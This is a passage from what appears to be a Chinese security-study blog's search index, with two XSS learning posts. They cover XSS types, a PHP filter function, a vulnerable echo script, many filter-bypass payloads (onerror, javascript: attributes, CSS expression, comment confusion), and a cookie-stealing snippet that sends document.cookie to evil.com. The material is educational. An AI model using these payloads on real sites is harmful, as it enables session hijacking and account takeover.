class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$parm</span> = array_merge(<span class="variable">$parm1</span>, <span class="variable">$parm2</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; sizeof(<span class="variable">$parm</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> = <span class="string">'/'</span>; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$j</span> = 0; <span class="variable">$j</span> &lt; strlen(<span class="variable">$parm</span>[<span class="variable">$i</span>]); <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$j</span> &gt; 0) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'('</span>; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'(&amp;#[x|X]0([9][a][b]);?)?'</span>; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'|(&amp;#0([9][10][13]);?)?'</span>; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">')?'</span>; </span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="variable">$parm</span>[<span class="variable">$i</span>][<span class="variable">$j</span>]; </span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'/i'</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$string</span> = preg_replace(<span class="variable">$pattern</span>, <span class="string">' '</span>, <span class="variable">$string</span>); </span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">return</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的作用是过滤XSS跨站代码，程序在处理输入变量时使用该函数，就可过滤常见的跨站脚本。<br>但它依旧存在被绕过的可能，下列从攻的角度展示一些绕过XSS Filter的测试用例。</p><h4 id="1-利用-lt-gt-标记注射Html-Javascript"><a href="#1-利用-lt-gt-标记注射Html-Javascript" class="headerlink" title="(1)利用&lt;&gt;标记注射Html/Javascript"></a>(1)利用&lt;&gt;标记注射Html/Javascript</h4><p>如<code>&lt;script&gt;alert;&lt;/script&gt;或&lt;script&gt;shellcode&lt;/script&gt;</code><br>因此，XSS Filter最先要进行过滤和转义的就是“&lt;&gt;”和<code>&lt;script&gt;</code>等字符。</p><h6 id="2-利用HTML标签属性值执行XSS。"><a href="#2-利用HTML标签属性值执行XSS。" class="headerlink" title="(2)利用HTML标签属性值执行XSS。"></a>(2)利用HTML标签属性值执行XSS。</h6><p>如下代码:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=<span class="string">"javescript:alert(/XSS/)"</span>&gt;&lt;/table&gt;</span><br><span class="line">&lt;img scr=<span class="string">"javescript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure><p>在IE6浏览器中运行上述代码会弹出对话框，即攻击成功，但它具有一定的局限性，即只能在支持javascript:[code]伪协议的浏览器运行。<br>通常只有引用文件的属性才能触发跨站脚本，我们可以使用以下属性来测试XSS</p><p>href=</p><p>lowsrc=</p><p>bgsound=</p><p>background=</p><p>value=</p><p>action=</p><p>dynsrc=<br>所以，要防御基于属性值的XSS，就要过滤javascript等关键字，另外还有其他允许值如Vbscript<br>（3）空格回车Tab</p><p>XSS Filter把敏感的输入字符列入黑名单处理，可以利用空格、回车和Tab键绕过 例：</p><p>&lt;img src=”javas</p><p>script:</p><p>alert(/xss/)”&gt;</p><h4 id="4）对标签属性值转码"><a href="#4）对标签属性值转码" class="headerlink" title="(4）对标签属性值转码"></a>(4）对标签属性值转码</h4><p>对普通HTML标记的属性值过滤，还可以通过编码处理来绕过。</p><p>Tab符的ASCII码&amp;#9、换行符&amp;#10、回车符&amp;#13可以插入任意地方</p><p>为了防范标签纸属性编码的XSS，最好也过滤&amp;#/等字符</p><h4 id="5）产生自己的事件"><a href="#5）产生自己的事件" class="headerlink" title="(5）产生自己的事件"></a>(5）产生自己的事件</h4><p>不能依靠属性值跨站，通过事件，如click、mouseover、load等，响应事件的函数叫事件处理函数例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"#"</span> onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>onerror是IMG标记的一个事件，页面发生错误，该事件被激活。上例，解释IMG标记时，加载src属性引用的图片地址，若图片不存在就触发onerror事件。其他事件：onResume</p><p>onReverse</p><p>onRowDelete</p><p>onRowInseted<br>等</p><h4 id="6）利用CSS跨站"><a href="#6）利用CSS跨站" class="headerlink" title="(6）利用CSS跨站"></a>(6）利用CSS跨站</h4><p>CSS中使用expression同样可以触发XSS。例：</p><div style="width: expression(alert('xss'));"><p>脚本代码通常被嵌入到style标签/属性中。style属性可以和任意字符的标签结合，所以不只要过滤标签，还必须对style属性值进行过滤。</p><p>例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">"list-style-image:url(javascript:alert(‘xss’))"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img style=<span class="string">"background-image:url(javascript：alert('xss'))"</span>&gt;  等同于</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">" javascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure><p>此外，可以使用<link>标签引用CSS，除<link>标签外，网页中引用外部CSS还可以利用@import导入，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">'test/css'</span>/&gt;import url(http://.../xss.css);&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>@import还可以直接执行JS代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">@import <span class="string">'javascript:alert("xss")'</span>;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>因此，包含expression、javascript、import等敏感字符的样式表也要进行过滤。</p><h4 id="7）扰乱过滤规则"><a href="#7）扰乱过滤规则" class="headerlink" title="(7）扰乱过滤规则"></a>(7）扰乱过滤规则</h4><p>转换大小写、大小写混淆、不用双引号用单引号、不使用引号。IMG标记和src属性之间没有空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">"javascript:alert('xss');"</span>&gt;</span><br></pre></td></tr></table></figure><p>利用expression跨站时，可以构造不同的全角字符。<br>运用/**/来注释字符，样式标签中的\和结束符\0。<br>将CSS关键字转码，e转\65，改变编码中0的数量\065、\0065<br>利用浏览器解析HTML注释存在的问题来执行JS，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;img src=<span class="string">"--&gt;&lt;img src=x onerror=alert(1)//"</span>&gt;</span><br></pre></td></tr></table></figure><p>纯文本标签造成的混乱标记，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;&lt;img src=<span class="string">"&lt;/style&gt;&lt;img src=x onerror=alert(1)//"</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h4><p>字符编码在跨站脚本中经常用到，透过这种技巧，不仅能让XSS绕过服务端的过滤，还能更好的隐藏shellcode<br>具体内容推荐博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/82944455" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/82944455</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(一)</title>
      <link href="/2019/10/26/note1/"/>
      <url>/2019/10/26/note1/</url>
      
        <content type="html"><![CDATA[<h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h4><p>XSS（Cross Site Scripting）攻击全称跨站脚本攻击，是一种通过注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序，从而获取更高的权限、私密网页内容、会话和cookie等各种内容的计算机安全漏洞。 恶意网页程序包括JavaScript、Java、HTML等。<a id="more"></a></p><h4 id="2-类型"><a href="#2-类型" class="headerlink" title="2.类型"></a>2.类型</h4><h6 id="xss攻击可以分成两大类："><a href="#xss攻击可以分成两大类：" class="headerlink" title="xss攻击可以分成两大类："></a>xss攻击可以分成两大类：</h6><p>(1)非持久型攻击：一次性，仅对当次的页面访问产生影响。用户访问一个被攻击者篡改后的链接后，被植入的攻击脚本被游览器执行，从而达到攻击目的。<br>(2)持久型攻击：攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p><h6 id="常见的三种XSS攻击类型"><a href="#常见的三种XSS攻击类型" class="headerlink" title="常见的三种XSS攻击类型"></a>常见的三种XSS攻击类型</h6><p>1.反射型(非持久 后端)：<br>通过浏览器直接“反射”给用户，例如攻击者提前构造一个恶意链接，来诱使用户点击，比如这样的一段链接：<code>www.abc.com/?params=&lt;script&gt;alert(/xss/)&lt;/script&gt;。</code><br>2.存储型(持久 后端)：<br>黑客输入的恶意脚本存储在服务器的数据库中。当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。一个场景是攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。<br>3.DOM Based XSS(持久 前端)：<br>一种利用前端代码漏洞进行攻击的攻击方式，前面的反射型XSS与存储型XSS本质都是利用后端代码的漏洞，payload在响应页面中。DOM Based payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。<br>例如提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p><h5 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h5><p>本地服务器的的/xssTest 目录下，有一个test.php文件，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $userName=$_GET[<span class="string">'userName'</span>];                    <span class="comment">//获取用户输入的参数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;"</span>.$userName.<span class="string">"&lt;/b&gt;"</span>;                    <span class="comment">//直接输出用户的参数给前端页面</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下，用户提交的姓名可以正确显示在页面上，不会构成XSS攻击，比如，当用户访问以下URL：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xssTest/test.php?userName=jack`</span><br></pre></td></tr></table></figure><p>页面会显示：<br><img src="https://img-blog.csdnimg.cn/2019103121021226.png" alt="1"><br>可以看到，用户在URL中输入的参数正常显示在页面上。然后，我们在URL中插入JavaScript代码，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xssTest/test.php?userName=&lt;script&gt;window.open(http://www.baidu.com)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>则页面会显示：<br><img src="https://img-blog.csdnimg.cn/20191031210340900.png" alt="2"><br>可以看到，页面没有把userName后面的内容显示出来，而且打开了一个新的标签页,原因是在URL中带有一段打开另一标签页的恶意脚本。<br>这个例子体现了最简单的XSS攻击的完整流程。</p><h6 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h6><p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以<strong>JavaScript可以做什么，XSS攻击就可以做什么。</strong><br>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，意味着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xssTest/test.php?userName=&lt;scriipt src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img=document.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://www.evil.com/log?"</span>+escape(document.cookie);  </span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。</p><h6 id="参考文献来自于百度，csdn-博客园，个人博客站点等"><a href="#参考文献来自于百度，csdn-博客园，个人博客站点等" class="headerlink" title="参考文献来自于百度，csdn,博客园，个人博客站点等"></a>参考文献来自于百度，csdn,博客园，个人博客站点等</h6><h6 id="推荐文章-https-www-cnblogs-com-Renyi-Fan-p-9951407-html"><a href="#推荐文章-https-www-cnblogs-com-Renyi-Fan-p-9951407-html" class="headerlink" title="推荐文章 https://www.cnblogs.com/Renyi-Fan/p/9951407.html"></a>推荐文章 <a href="https://www.cnblogs.com/Renyi-Fan/p/9951407.html" target="_blank" rel="noopener">https://www.cnblogs.com/Renyi-Fan/p/9951407.html</a></h6>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
